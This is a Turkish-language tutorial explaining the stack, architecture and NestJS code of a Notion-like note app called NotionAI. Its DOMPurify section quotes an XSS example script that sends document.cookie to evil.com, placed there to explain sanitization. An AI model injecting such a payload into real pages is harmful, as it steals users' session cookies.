# NotionAI — Kapsamlı Proje Eğitimi

> Bu doküman, ortalama bir bilgisayar mühendisinin sıfırdan okuyarak NotionAI projesini **tamamen** anlayabileceği şekilde hazırlanmıştır. Her kavram, her teknoloji, her kod satırı açıklanmış; kavramlar örneklerle desteklenmiştir. Bu doküman PDF/LaTeX formatına çevrilebilir yapıda hazırlanmıştır.

---

## İçindekiler

1. [Proje Nedir ve Ne Yapar?](#1-proje-nedir-ve-ne-yapar)
2. [Teknoloji Yığını — Her Biri Nedir?](#2-teknoloji-yığını--her-biri-nedir)
3. [Mimari ve Veri Akışı](#3-mimari-ve-veri-akışı)
4. [Backend: NestJS Temelleri](#4-backend-nestjs-temelleri)
5. [Backend: Prisma ORM ve Veritabanı Şeması](#5-backend-prisma-orm-ve-veritabanı-şeması)
6. [Backend: Kimlik Doğrulama (Auth) Sistemi](#6-backend-kimlik-doğrulama-auth-sistemi)
7. [Backend: Güvenlik Katmanı](#7-backend-güvenlik-katmanı)
8. [Backend: Modüllerin Detaylı İncelenmesi](#8-backend-modüllerin-detaylı-incelenmesi)
9. [Frontend: React ve Ekosistemi](#9-frontend-react-ve-ekosistemi)
10. [Frontend: State ve API Yönetimi](#10-frontend-state-ve-api-yönetimi)
11. [Frontend: Sayfalar ve Bileşenler](#11-frontend-sayfalar-ve-bileşenler)
12. [Docker ve Çalışma Ortamı](#12-docker-ve-çalışma-ortamı)
13. [Güvenlik Değerlendirmesi](#13-güvenlik-değerlendirmesi)
14. [Çevre Değişkenleri ve Konfigürasyon](#14-çevre-değişkenleri-ve-konfigürasyon)

---

## 1. Proje Nedir ve Ne Yapar?

### 1.1 Projenin Amacı

NotionAI, Notion benzeri bir **block-based not alma uygulamasıdır**. Kullanıcıların zengin metin formatlarında notlar yazmasını, bu notları organize etmesini ve yapay zeka desteğiyle notlarından faydalanmasını sağlar.

### 1.2 Kullanıcı Hikayeleri

Bir kullanıcı olarak şunları yapabilirsiniz:

- **Not oluşturma**: Başlık, paragraf, liste, kod bloğu, alıntı, resim gibi zengin içerikli notlar yazabilirsiniz.
- **Etiketleme**: Notlarınıza renkli etiketler ekleyebilir ve kategorize edebilirsiniz.
- **Arşivleme ve sabitleme**: Önemli notları sabitleyebilir (en üste), gereksiz notları arşivleyebilirsiniz.
- **AI sohbet**: Notlarınızın içeriğinden yararlanarak yapay zeka asistanına sorular sorabilirsiniz. Örneğin: "Geçen hafta yazdığım tasarruf notunu özetler misin?"
- **Arama**: Notlarınızı anahtar kelime ile arayabilirsiniz.
- **Tema değiştirme**: Karanlık ve aydınlık tema arasında geçiş yapabilirsiniz.

### 1.3 Temel Prensipler

| Prensip | Açıklama |
|---------|----------|
| **Kullanıcı İzolasyonu** | Her kullanıcı sadece kendi notlarına, sohbetlerine ve etiketlerine erişebilir. |
| **AI Read-Only** | Yapay zeka asistanı notlarınızı asla düzenlemez, siler veya değiştirilemez. Sadece okur ve size bilgi verir. |
| **Soft Delete** | Notlar fiziksel olarak silinmez, `isArchived = true` yapılarak arşivlenir. İstenirse geri getirilebilir. |
| **Auto-Save** | Notlarınızı yazarken 2 saniye durduğunuzda otomatik olarak kaydedilir. |

---

## 2. Teknoloji Yığını — Her Biri Nedir?

Bu bölümde projede kullanılan her teknolojinin ne olduğunu, neden kullanıldığını ve alternatiflerini öğreneceksiniz.

### 2.1 Backend Teknolojileri

#### NestJS 10

**NestJS Nedir?**

NestJS, TypeScript tabanlı bir Node.js sunucu tarafı framework'üdür. Angular'ın mimarisinden ilham alır: modüler yapı, decorator'lar (annotation'lar) ve dependency injection (bağımlılık enjeksiyonu) kullanır.

**Neden NestJS?**

| Özellik | Açıklama |
|---------|----------|
| **Modüler Yapı** | Kodu mantıksal modüllere ayırarak bakımı kolaylaştırır. Her modül (auth, notes, chat vb.) kendi controller, service ve testlerini içerir. |
| **Dependency Injection** | Sınıflar arası bağımlılıkları otomatik yönetir. Bir servise ihtiyaç duyan başka bir servis, NestJS tarafından otomatik olarak oluşturulur ve enjekte edilir. |
| **Decorator'lar** | `@Controller()`, `@Get()`, `@Post()` gibi decorator'lar sayesinde routing, validation, auth gibi işlemleri deklaratif (bildirimsel) olarak yaparsınız. |
| **Ekosistem** | `@nestjs/jwt`, `@nestjs/throttler`, `@nestjs/websockets` gibi resmi paketlerle hızlıca özellik ekleyebilirsiniz. |

**Alternatifleri:** Express.js (daha basit ama yapısal değil), Fastify (daha hızlı ama ekosistem daha küçük), AdonisJS.

#### Prisma 5

**Prisma Nedir?**

Prisma, TypeScript/JavaScript için modern bir ORM'dir (Object-Relational Mapping). SQL yazmadan veritabanı işlemleri yapmanızı sağlar.

**Prisma'nın Üç Bileşeni:**

1. **Prisma Schema** (`schema.prisma`): Veritabanı tablolarını, ilişkilerini ve tiplerini tanımlarsınız.
2. **Prisma Client**: Type-safe (tip güvenli) sorgular yazmanızı sağlayan otomatik üretilmiş bir kütüphanedir.
3. **Prisma Migrate**: Schema değişikliklerini veritabanına yansıtmanızı sağlar.

**Neden Prisma?**

| Özellik | Açıklama |
|---------|----------|
| **Type Safety** | `prisma.note.findMany()` çağrısı tamamen tip güvenlidir. TypeScript, yanlış alan adı yazarsanız derleme hatası verir. |
| **Auto-Completion** | IDE'niz (VS Code) Prisma sorgularında otomatik tamamlama sunar. |
| **Migrations** | Schema değişikliklerini versiyon kontrolüne uygun migration dosyaları olarak yönetirsiniz. |
| **Raw SQL Desteği** | `$queryRaw` ve `$executeRaw` ile gerektiğinde ham SQL de yazabilirsiniz. |

**Alternatifleri:** TypeORM, Sequelize, MikroORM, Knex.js.

#### PostgreSQL 15 + pgvector

**PostgreSQL Nedir?**

PostgreSQL, dünyanın en gelişmiş açık kaynaklı ilişkisel veritabanı yönetim sistemidir (RDBMS). MySQL'e göre daha zengin özelliklere sahiptir: JSON desteği, full-text search, advanced indexing, extensibility.

**pgvector Nedir?**

`pgvector`, PostgreSQL için bir eklentidir (extension). Vektör (sayı dizisi) verilerini saklamanızı ve bunlar üzerinde benzerlik araması (similarity search) yapmanızı sağlar.

**Neden pgvector?**

Yapay zeka uygulamalarında metinleri sayısal vektörlere dönüştürürüz (embedding). Örneğin "para biriktirme" cümlesi 1536 boyutlu bir vektöre çevrilir. `pgvector` sayesinde bu vektörleri PostgreSQL'de saklayıp, "en yakın vektörleri bul" sorgusu atabiliriz. Bu, semantik arama (anlamsal arama) yapmanızı sağlar.

#### Redis 7

**Redis Nedir?**

Redis, verileri bellekte (RAM) saklayan bir key-value veritabanıdır. Disk tabanlı veritabanlarına (PostgreSQL, MySQL) göre çok daha hızlıdır.

**Projedeki Kullanımı:**

Şu an projede Redis, cache ve pub/sub mekanizması için altyapı olarak hazır bulunmaktadır. Gelecekte şu amaçlarla kullanılabilir:
- Session cache'leme
- Rate limiting sayaçları
- Real-time bildirimlerin pub/sub kanalı

#### Passport.js + JWT

**JWT (JSON Web Token) Nedir?**

JWT, iki taraf arasında güvenli bilgi taşıyan bir standarttır (RFC 7519). Üç bölümden oluşur ve her bölüm Base64Url ile kodlanır:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9      ← Header (Base64)
.eyJzdWIiOiIxMjMiLCJlbWFpbCI6ImFAYS5jb20ifQ  ← Payload (Base64)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature
```

- **Header**: Token tipi (`JWT`) ve imza algoritması (`HS256`).
- **Payload**: Taşınan veriler. `sub` (subject/kullanıcı ID), `email`, `role`, `iat` (issued at), `exp` (expiration).
- **Signature**: `HMACSHA256(base64Url(header) + "." + base64Url(payload), secret)`.

**Neden JWT?**

| Özellik | Açıklama |
|---------|----------|
| **Stateless** | Sunucu session'ları saklamak zorunda değildir. Token kendinde tüm bilgiyi taşır. |
| **Taşınabilir** | Aynı token farklı servislerde (microservices) kullanılabilir. |
| **Zaman Sınırlı** | `exp` alanı sayesinde token'ın geçerlilik süresi kontrol edilir. |

**Passport.js Nedir?**

Passport.js, Node.js için esnek ve modüler bir kimlik doğrulama middleware'idir. 500'den fazla strateji (strategi) destekler: JWT, OAuth, Google, GitHub, vs.

Projede `passport-jwt` stratejisi kullanılır: Gelen istekteki JWT'yi doğrular ve `request.user`'a payload'ı yerleştirir.

#### bcrypt

**bcrypt Nedir?**

bcrypt, şifreleri hash'lemek (tek yönlü şifreleme) için kullanılan bir algoritmadır. Şifreleri asla düz metin (plaintext) olarak saklamaz.

**Nasıl Çalışır?**

```
Düz Metin Şifre + Salt (rastgele değer) → bcrypt algoritması → Hash
```

- **Salt**: Her hash işleminde rastgele üretilen bir değerdir. Aynı şifre bile farklı salt ile farklı hash üretir.
- **Work Factor (Rounds)**: `bcrypt.hash(password, 10)` çağrısındaki `10`, 2^10 = 1024 iterasyon demektir. Ne kadar yüksekse o kadar güvenli ama o kadar yavaş.

**Neden bcrypt?**

| Özellik | Açıklama |
|---------|----------|
| **Adaptive** | Bilgisayarlar hızlandıkça rounds sayısını artırabilirsiniz. |
| **Salt Otomatik** | Her hash farklı salt kullanır, rainbow table saldırılarına karşı korur. |
| **Zamanlama Saldırısı Koruması** | Sabit zamanlı karşılaştırma (timing-safe comparison). |

**Alternatifleri:** Argon2 (daha modern, önerilen), scrypt, PBKDF2.

#### Groq API

**Groq Nedir?**

Groq, yapay zeka modellerini (LLM'leri) hızlı ve ucuz bir şekilde çalıştıran bir bulut hizmetidir. Llama, Gemma, Mixtral gibi açık kaynak modelleri sunar.

**Projedeki Kullanımı:**

```typescript
const openai = new OpenAI({
  apiKey: process.env.OPENAI_API_KEY,
  baseURL: 'https://api.groq.com/openai/v1',
});
```

OpenAI SDK'sını kullanarak Groq API'ye istek atarız. `baseURL`'yi değiştirerek farklı sağlayıcıya yönlendiririz.

**Neden Groq?**

| Özellik | Açıklama |
|---------|----------|
| **Hızlı** | Özel LPU (Language Processing Unit) donanımı ile çok düşük gecikme. |
| **Ucuz** | OpenAI'a göre daha uygun fiyatlandırma. |
| **Açık Modeller** | Llama gibi açık kaynak modelleri kullanır. |
| **OpenAI Uyumlu** | Mevcut OpenAI kodunuzu değiştirmeden kullanabilirsiniz. |

**Kullanılan Model:** `llama-3.1-8b-instant` — Meta'nın Llama 3.1 modelinin 8 milyar parametreli, hızlı versiyonu.

**Sınırlaması:** Groq, embedding API'si sunmaz. Bu yüzden projede embedding oluşturma fonksiyonu rastgele vektör döndürür (fallback).

#### Socket.IO

**Socket.IO Nedir?**

Socket.IO, gerçek zamanlı (real-time), çift yönlü (bidirectional) iletişim sağlayan bir kütüphanedir. WebSocket protokolünü kullanır ama WebSocket desteklenmeyen tarayıcılarda otomatik olarak HTTP long-polling'e düşer.

**Projedeki Kullanımı:**

Bildirim (notification) sistemi için kullanılır. Backend bir bildirim göndermek istediğinde, ilgili kullanıcının Socket.IO room'una mesaj gönderir.

**Neden Socket.IO?**

| Özellik | Açıklama |
|---------|----------|
| **Otomatik Fallback** | WebSocket çalışmazsa long-polling kullanır. |
| **Room'lar** | Kullanıcıları gruplara ayırıp gruba mesaj gönderebilirsiniz. |
| **Reconnect** | Bağlantı koparsa otomatik yeniden bağlanma. |

#### class-validator

**class-validator Nedir?**

TypeScript/JavaScript class'ları üzerinde deklaratif validasyon yapmanızı sağlayan bir kütüphanedir. Decorator'lar kullanarak alanların kurallarını tanımlarsınız.

**Örnek:**

```typescript
export class RegisterDto {
  @IsEmail()
  email: string;

  @IsString()
  @MinLength(6)
  password: string;
}
```

`ValidationPipe` sayesinde API'ye gelen her istek otomatik olarak bu kurallara göre kontrol edilir.

#### @nestjs/throttler

**Rate Limiting Nedir?**

Bir IP adresinin veya kullanıcının belirli bir zaman diliminde yapabileceği istek sayısını sınırlamaktır. Brute force (kaba kuvvet) saldırılarına ve aşırı yüklenmelere karşı korur.

**Projedeki Kullanımı:**

```typescript
ThrottlerModule.forRoot([{
  ttl: 60000,    // 60 saniyelik pencere
  limit: 30,     // Bu pencerede en fazla 30 istek
}])
```

Dakikada 30'dan fazla istek atan bir IP'ye `429 Too Many Requests` döner.

---

### 2.2 Frontend Teknolojileri

#### React 19

**React Nedir?**

React, Facebook tarafından geliştirilen bir JavaScript kütüphanesidir. Kullanıcı arayüzlerini (UI) bileşenler (component) halinde oluşturmanızı sağlar.

**Temel Kavramlar:**

| Kavram | Açıklama |
|--------|----------|
| **Component** | UI'nın bağımsız, yeniden kullanılabilir parçası. Bir buton, bir form, bir sayfa hepsi component olabilir. |
| **JSX** | JavaScript içinde HTML benzeri syntax yazmanızı sağlar. `const element = <h1>Merhaba</h1>;` |
| **Props** | Component'e dışarıdan veri aktarma mekanizması. Read-only'dir. |
| **State** | Component'in içinde değişebilen veri. State değiştiğinde component yeniden render edilir. |
| **Hooks** | Fonksiyonel component'lerde state ve lifecycle özellikleri kullanmanızı sağlayan fonksiyonlar. |

**React 19'daki Yenilikler:**

- **Actions**: Form gönderimleri ve state güncellemelerini basitleştirir.
- **useOptimistic**: Optimistic UI pattern'ini native destekler.
- **Document Metadata**: `<title>`, `<meta>` gibi etiketleri component içinde yönetme.

#### Vite 5

**Vite Nedir?**

Vite (Fransızca "hızlı" anlamına gelir), modern web projeleri için geliştirme ortamı ve build aracıdır.

**Webpack vs Vite:**

| Özellik | Webpack | Vite |
|---------|---------|------|
| **Başlangıç Süresi** | Tüm uygulamayı bundle eder, yavaş başlar | ESM (ES Modules) kullanır, anında başlar |
| **HMR** | Değişiklikleri algılaması yavaş | Değişiklikleri milisaniyeler içinde algılar |
| **Build** | Kodu tek bir dosyada toplar | Rollup kullanır, daha optimize build üretir |
| **Konfigürasyon** | Karmaşık | Minimal, zero-config yaklaşımı |

**Vite Nasıl Çalışır?**

Geliştirme modunda:
1. Kodunuzu ESM (ES Module) olarak sunar.
2. Tarayıcı, ihtiyaç duyduğu modülleri doğrudan sunucudan ister.
3. Değişiklik olduğunda sadece değişen modülü günceller (HMR).

Build modunda:
1. Rollup kullanarak kodu bundle eder.
2. Tree-shaking (kullanılmayan kodları kaldırma) yapar.
3. Minification (küçültme) ve code splitting uygular.

#### TypeScript 5

**TypeScript Nedir?**

TypeScript, JavaScript'e tip sistemi ekleyen bir üst kümesidir (superset). `.ts` dosyaları derlenerek `.js` dosyalarına çevrilir.

**Neden TypeScript?**

| Özellik | Açıklama |
|---------|----------|
| **Tip Güvenliği** | `const name: string = 42;` yazarsanız derleme hatası alırsınız. |
| **Auto-Completion** | IDE'niz değişkenlerin tipini bilir, doğru öneriler sunar. |
| **Refactoring** | Bir alanı yeniden adlandırırken IDE tüm kullanımları günceller. |
| **Dokümantasyon** | Tip tanımları kodu dokümante eder. |

**Örnek:**

```typescript
interface User {
  id: string;
  email: string;
  name: string | null;  // string veya null olabilir
}

function greet(user: User): string {
  return `Merhaba ${user.name || 'Misafir'}`;
}
```

#### Tailwind CSS 3

**Tailwind CSS Nedir?**

Utility-first CSS framework'üdür. Önceden tanımlanmış küçük CSS sınıflarıyla stil verirsiniz. `.btn-primary`, `.card` gibi component tabanlı class'lar yerine `flex`, `p-4`, `bg-blue-500` gibi utility class'lar kullanırsınız.

**Örnek:**

```html
<!-- Geleneksel CSS -->
<div class="card">
  <h1 class="card-title">Başlık</h1>
</div>

<!-- Tailwind CSS -->
<div class="rounded-lg bg-white p-6 shadow-md">
  <h1 class="text-2xl font-bold text-gray-900">Başlık</h1>
</div>
```

**Avantajları:**

| Avantaj | Açıklama |
|---------|----------|
| **Hızlı Geliştirme** | CSS dosyaları arasında gezinmeye gerek yok, HTML içinde stil verirsiniz. |
| **Küçük Bundle** | Kullanılmayan CSS'leri PurgeCSS ile otomatik kaldırır. |
| **Tutarlılık** | Önceden tanımlanmış spacing, renk, tipografi scale'i sayesinde tutarlı tasarım. |
| **Responsive** | `md:flex`, `lg:p-8` gibi prefix'lerle responsive tasarım yaparsınız. |

#### TipTap 2

**TipTap Nedir?**

TipTap, ProseMirror editor framework'ü üzerine kurulmuş, modern ve headless (stilsiz) bir rich text editörüdür. "Headless" demek, editörün kendi CSS'i olmadığı, sizin stil vermeniz gerektiği anlamına gelir.

**Neden TipTap?**

| Özellik | Açıklama |
|---------|----------|
| **Block-Based** | Notion gibi blok yapısı. Her paragraf, başlık, liste bir "blok"tur. |
| **Extensible** | Extension sistemi ile kolayca yeni özellik ekleyebilirsiniz. |
| **Framework Agnostic** | React, Vue, Angular, vanilla JS ile çalışır. |
| **Collaborative Ready** | Yjs ile real-time işbirlikçi düzenlemeye hazır. |

**StarterKit:** Temel formatlama özelliklerini (bold, italic, heading, list, blockquote, code, history) içeren extension paketidir.

#### Zustand 4

**Zustand Nedir?**

Zustand (Almanca "durum" anlamına gelir), React için minimal bir state yönetim kütüphanesidir.

**Redux vs Zustand:**

| Özellik | Redux | Zustand |
|---------|-------|---------|
| **Boilerplate** | Çok fazla (actions, reducers, selectors) | Çok az |
| **Store Tanımı** | `createStore(reducer)` | `create((set) => ({ ... }))` |
| **Async Logic** | Thunk veya Saga gerekir | Doğrudan async fonksiyon yazarsınız |
| **Bundle Size** | ~7 KB | ~1 KB |

**Örnek:**

```typescript
import { create } from 'zustand';

const useStore = create((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
}));

// Kullanımı
function Counter() {
  const { count, increment } = useStore();
  return <button onClick={increment}>{count}</button>;
}
```

#### Axios

**Axios Nedir?**

Axios, tarayıcı ve Node.js için promise tabanlı bir HTTP client kütüphanesidir. `fetch` API'sine göre daha zengin özelliklere sahiptir.

| Özellik | Axios | fetch |
|---------|-------|-------|
| **Otomatik JSON** | Response'u otomatik parse eder | Manuel `response.json()` gerekir |
| **Request/Response Interceptors** | Var | Yok (manuel yapılmalı) |
| **Request Timeout** | Var | Yok |
| **XSRF Koruması** | Var | Yok |
| **Upload Progress** | Var | Yok |

#### React Router 7

**React Router Nedir?**

React Router, React uygulamalarında client-side routing (sayfa yönlendirme) sağlayan kütüphanedir. Sayfa yenilenmeden URL değiştirir, farklı component'leri gösterir.

**Temel Kavramlar:**

| Kavram | Açıklama |
|--------|----------|
| `<Routes>` | Route tanımlarını gruplar |
| `<Route>` | Belirli bir path'e karşılık gelen component |
| `<Navigate>` | Programatik yönlendirme |
| `useNavigate()` | Fonksiyonel component'te yönlendirme yapma |

#### DOMPurify

**DOMPurify Nedir?**

DOMPurify, XSS (Cross-Site Scripting) saldırılarına karşı koruma sağlayan bir HTML sanitization kütüphanesidir. Kullanıcıdan veya dış kaynaktan gelen HTML'i temizleyerek zararlı script'leri kaldırır.

**XSS Nedir?**

XSS, saldırganın web uygulamanıza zararlı JavaScript kodu enjekte etmesidir. Örneğin bir kullanıcı `<script>fetch('https://evil.com?cookie=' + document.cookie)</script>` yazarsa ve siz bu metni direkt HTML olarak render ederseniz, tüm kullanıcıların çerezleri (cookie'leri) saldırgana gider.

#### lucide-react

**lucide-react Nedir?**

lucide-react, SVG ikonları sunan bir React kütüphanesidir. Her ikon bir React component'i olarak kullanılır.

```tsx
import { Pin, Trash2, Loader2 } from 'lucide-react';

<Pin className="h-4 w-4" />           // Sabitleme ikonu
<Trash2 className="h-4 w-4" />         // Çöp kutusu ikonu
<Loader2 className="animate-spin" />   // Dönen yükleme ikonu
```

---

## 3. Mimari ve Veri Akışı

### 3.1 Sistem Mimarisi

```
┌─────────────────────────────────────────────────────────────────────┐
│                           Kullanıcı (Browser)                       │
└──────────────────────┬──────────────────────────────────────────────┘
                       │ HTTP / WebSocket
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  React 19 (Vite)  —  Zustand  —  Axios  —  React Router            │
│  ├── Dashboard (not editörü, sidebar, arama)                       │
│  ├── ChatPage (AI sohbet arayüzü)                                 │
│  ├── Login / Register                                             │
│  └── Socket.IO Client (bildirimler)                               │
└──────────────────────┬──────────────────────────────────────────────┘
                       │ REST API / WS
                       ▼
┌─────────────────────────────────────────────────────────────────────┐
│  NestJS 10 (Port 3001)                                             │
│  ├── ValidationPipe (DTO doğrulama)                                │
│  ├── ThrottlerGuard (rate limiting)                                │
│  ├── AuthGuard (JWT doğrulama)                                     │
│  ├── RolesGuard (rol kontrolü)                                     │
│  └── Modüller:                                                     │
│      ├── auth/      → register, login, refresh, logout             │
│      ├── notes/     → CRUD, soft delete, pin, archive              │
│      ├── blocks/    → TipTap ↔ Prisma dönüşümü                     │
│      ├── tags/      → etiket CRUD, not-etag ilişkisi               │
│      ├── chat/      → AI sohbet (not bağlamlı)                     │
│      ├── ai/        → Groq entegrasyonu (özet, sohbet, etiket)     │
│      ├── search/    → keyword-based arama (semantic fallback)      │
│      └── notifications/ → Socket.IO gateway                        │
└──────────────┬─────────────────────┬────────────────────────────────┘
               │                     │
               ▼                     ▼
        ┌──────────────┐      ┌──────────┐
        │ PostgreSQL 15│      │  Redis 7 │
        │ + pgvector   │      │          │
        │              │      │ (Cache & │
        │ User, Note,  │      │  PubSub) │
        │ Block, Tag,  │      └──────────┘
        │ Chat, Message│
        │ Embedding    │
        └──────┬───────┘
               │
               ▼
        ┌──────────────┐
        │  Groq API    │
        │ llama-3.1-   │
        │ 8b-instant   │
        └──────────────┘
```

### 3.2 Tipik Bir İstek Akışı (Not Oluşturma)

Adım adım inceleyelim:

**Adım 1 — Kullanıcı Etkileşimi**

Kullanıcı "Yeni Not" butonuna tıklar. `Dashboard.tsx`'te `handleCreateNote` fonksiyonu tetiklenir.

**Adım 2 — Frontend API Çağrısı**

```typescript
const res = await notesApi.create({ title: 'Yeni Not' });
```

`notesApi.create`, `axios.post('/notes', { title: 'Yeni Not' })` çağrısını yapar.

**Adım 3 — Axios Request Interceptor**

Her API isteğinden önce çalışan interceptor, `localStorage`'dan access token'ı alır ve isteğin header'ına ekler:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**Adım 4 — HTTP İsteği Backend'e Ulaşır**

`POST http://localhost:3001/notes`

**Adım 5 — NestJS Routing**

NestJS, `@Controller('notes')` decorator'ını gördüğü için isteği `NotesController`'a yönlendirir.

**Adım 6 — Guard'lar Çalışır**

```
ThrottlerGuard → Rate limit kontrolü (dakikada 30 istek)
AuthGuard → JWT doğrulama
RolesGuard → Rol kontrolü (bu projede herkes USER)
```

`AuthGuard`:
1. `Authorization` header'ından `Bearer` token'ı çıkarır.
2. `jwtService.verifyAsync()` ile token'i doğrular.
3. Doğrulanan payload'ı `request.user`'a atar: `{ sub: "user_123", email: "a@b.com", role: "USER" }`.

**Adım 7 — Controller**

```typescript
@Post()
create(@CurrentUser('sub') userId: string, @Body() dto: CreateNoteDto) {
  return this.notesService.create(userId, dto);
}
```

- `@CurrentUser('sub')`: `request.user.sub` değerini alır → `"user_123"`.
- `@Body()`: HTTP request body'sini `CreateNoteDto`'ya dönüştürür.
- `ValidationPipe`: `CreateNoteDto`'daki `@IsString()`, `@IsOptional()` decorator'larını kontrol eder.

**Adım 8 — Service**

```typescript
async create(userId: string, dto: CreateNoteDto) {
  return this.prisma.note.create({
    data: {
      userId,                    // "user_123"
      title: dto.title || 'Untitled',
      isPinned: dto.isPinned ?? false,
    },
    include: { tags: { include: { tag: true } }, blocks: true },
  });
}
```

Prisma Client, bu çağrıyı şu SQL'e dönüştürür:

```sql
INSERT INTO "Note" (id, title, "userId", "isArchived", "isPinned", "createdAt", "updatedAt")
VALUES ('cuid_abc', 'Yeni Not', 'user_123', false, false, NOW(), NOW());
```

**Adım 9 — Yanıt Dönüşü**

Prisma, oluşturulan not objesini döner. `include` sayesinde ilişkili `tags` ve `blocks` da getirilir.

**Adım 10 — Frontend State Güncellemesi**

```typescript
setNotes((prev) => [res.data, ...prev]);
setActiveNoteId(res.data.id);
```

Yeni not, mevcut not listesinin başına eklenir ve aktif not olarak seçilir.

---

## 4. Backend: NestJS Temelleri

### 4.1 NestJS'in Temel Yapı Taşları

NestJS uygulamaları üç temel yapı taşı üzerine kuruludur: **Controller**, **Service**, **Module**.

#### Controller

Controller'lar HTTP isteklerini karşılar ve yanıt döner. Bir sınıf üzerinde `@Controller('path')` decorator'ı kullanılarak tanımlanır.

**`notes.controller.ts` dosyasını satır satır inceleyelim:**

```typescript
import { Controller, Get, Post, Patch, Delete, Body, Param, Query, UseGuards } from '@nestjs/common';
```

- `@nestjs/common`: NestJS'in temel decorator ve utility'lerini içeren paket.
- `Controller`: Bir sınıfın controller olduğunu belirtir.
- `Get`, `Post`, `Patch`, `Delete`: HTTP method decorator'ları.
- `Body`: Request body'sini almak için.
- `Param`: URL path parametrelerini almak için.
- `Query`: URL query parametrelerini almak için.
- `UseGuards`: Route'a guard uygulamak için.

```typescript
import { NotesService } from './notes.service';
import { AuthGuard } from '../../common/guards/auth.guard';
import { CurrentUser } from '../../common/decorators/current-user.decorator';
```

- `NotesService`: Bu controller'ın kullanacağı service.
- `AuthGuard`: JWT doğrulama guard'ı.
- `CurrentUser`: Giriş yapmış kullanıcının bilgilerini almak için custom decorator.

```typescript
import { CreateNoteDto } from './dto/create-note.dto';
import { UpdateNoteDto } from './dto/update-note.dto';
```

- `CreateNoteDto`: Not oluşturma isteğinin veri yapısı.
- `UpdateNoteDto`: Not güncelleme isteğinin veri yapısı.

```typescript
@Controller('notes')
@UseGuards(AuthGuard)
export class NotesController {
```

- `@Controller('notes')`: Bu controller'ın base path'i `/notes` olur. Yani tüm route'lar `/notes/...` şeklinde olur.
- `@UseGuards(AuthGuard)`: Bu controller'daki TÜM method'lara `AuthGuard` uygulanır. Eğer tek bir method için istiyorsanız, method'un üzerine yazarsınız.

```typescript
  constructor(private notesService: NotesService) {}
```

- `constructor(private notesService: NotesService)`: **Dependency Injection (DI)**. NestJS, `NotesService`'in bir instance'ını otomatik olarak oluşturur ve controller'a enjekte eder.
- `private`: TypeScript'te constructor parametresi `private`, `protected` veya `public` olarak tanımlanırsa otomatik olarak sınıf özelliği (property) olur. Yani `this.notesService` olarak erişebilirsiniz.

```typescript
  @Get()
  findAll(
    @CurrentUser('sub') userId: string,
    @Query('archived') archived?: string,
    @Query('search') search?: string,
  ) {
    return this.notesService.findAll(userId, archived === 'true', search);
  }
```

- `@Get()`: Bu method, `GET /notes` isteklerini karşılar.
- `@CurrentUser('sub') userId: string`: `AuthGuard`'ın `request.user`'a koyduğu JWT payload'ından `sub` alanını çıkarır ve `userId` değişkenine atar.
- `@Query('archived') archived?: string`: URL'deki `?archived=true` query parametresini alır. Örneğin `GET /notes?archived=true`.
- `@Query('search') search?: string`: URL'deki `?search=merhaba` query parametresini alır.
- `archived === 'true'`: Query parametresi string gelir, bunu boolean'a çeviriyoruz.
- `return this.notesService.findAll(...)`: Service katmanına devrediyoruz.

```typescript
  @Get(':id')
  findOne(@CurrentUser('sub') userId: string, @Param('id') id: string) {
    return this.notesService.findOne(userId, id);
  }
```

- `@Get(':id')`: `GET /notes/:id` isteklerini karşılar. `:id` bir path parametresidir.
- `@Param('id') id: string`: URL'deki `abc123` değerini alır. Örneğin `GET /notes/abc123`.

```typescript
  @Post()
  create(@CurrentUser('sub') userId: string, @Body() dto: CreateNoteDto) {
    return this.notesService.create(userId, dto);
  }
```

- `@Post()`: `POST /notes` isteklerini karşılar.
- `@Body() dto: CreateNoteDto`: HTTP request body'sini alır ve `CreateNoteDto` tipine dönüştürür. `ValidationPipe` sayesinde body'deki veriler otomatik doğrulanır.

```typescript
  @Patch(':id')
  update(
    @CurrentUser('sub') userId: string,
    @Param('id') id: string,
    @Body() dto: UpdateNoteDto,
  ) {
    return this.notesService.update(userId, id, dto);
  }
```

- `@Patch(':id')`: `PATCH /notes/:id` isteklerini karşılar. PATCH, kısmi güncelleme için kullanılır (PUT ise tamamen replace eder).

```typescript
  @Delete(':id')
  remove(@CurrentUser('sub') userId: string, @Param('id') id: string) {
    return this.notesService.remove(userId, id);
  }
}
```

- `@Delete(':id')`: `DELETE /notes/:id` isteklerini karşılar.

#### Service

Service'ler iş mantığını (business logic) içerir. Controller'lar HTTP detaylarıyla uğraşırken, service'ler veritabanı işlemleri, hesaplamalar, dış API çağrıları gibi işleri yapar.

**`notes.service.ts` dosyasını inceleyelim:**

```typescript
import { Injectable, NotFoundException } from '@nestjs/common';
```

- `Injectable`: Bu sınıfın NestJS Dependency Injection sistemine katılmasını sağlar. Başka sınıflar tarafından constructor üzerinden enjekte edilebilir.
- `NotFoundException`: HTTP 404 durum kodu dönmek için kullanılan built-in exception.

```typescript
import { PrismaService } from '../../prisma/prisma.service';
import { CreateNoteDto } from './dto/create-note.dto';
import { UpdateNoteDto } from './dto/update-note.dto';
import { AiService } from '../ai/ai.service';
```

- `PrismaService`: Veritabanı işlemleri için.
- `AiService`: AI özetleme işlemleri için.

```typescript
@Injectable()
export class NotesService {
  constructor(
    private prisma: PrismaService,
    private aiService: AiService,
  ) {}
```

- `NotesService`, `PrismaService` ve `AiService`'e bağımlıdır.
- NestJS bu bağımlılıkları otomatik olarak çözer.

```typescript
  async findAll(userId: string, archived?: boolean, search?: string) {
    return this.prisma.note.findMany({
      where: {
        userId,
        isArchived: archived ?? false,
        ...(search
          ? {
              OR: [
                { title: { contains: search, mode: 'insensitive' } },
                { summary: { contains: search, mode: 'insensitive' } },
              ],
            }
          : {}),
      },
      include: { tags: { include: { tag: true } }, blocks: { orderBy: { order: 'asc' } } },
      orderBy: [{ isPinned: 'desc' }, { updatedAt: 'desc' }],
    });
  }
```

- `async/await`: Asenkron işlemler (veritabanı sorgusu) için.
- `this.prisma.note.findMany({...})`: Prisma Client'ın `findMany` metodu. `Note` modelinden çoklu kayıt getirir.
- `where`: Filtreleme koşulları.
  - `userId`: Sadece bu kullanıcının notları.
  - `isArchived: archived ?? false`: Eğer `archived` parametresi verilmediyse `false` (arşivlenmemiş notlar).
  - `...(search ? { OR: [...] } : {})`: Spread operator ile koşullu filtreleme. Eğer `search` varsa `title` VEYA `summary` içinde arar.
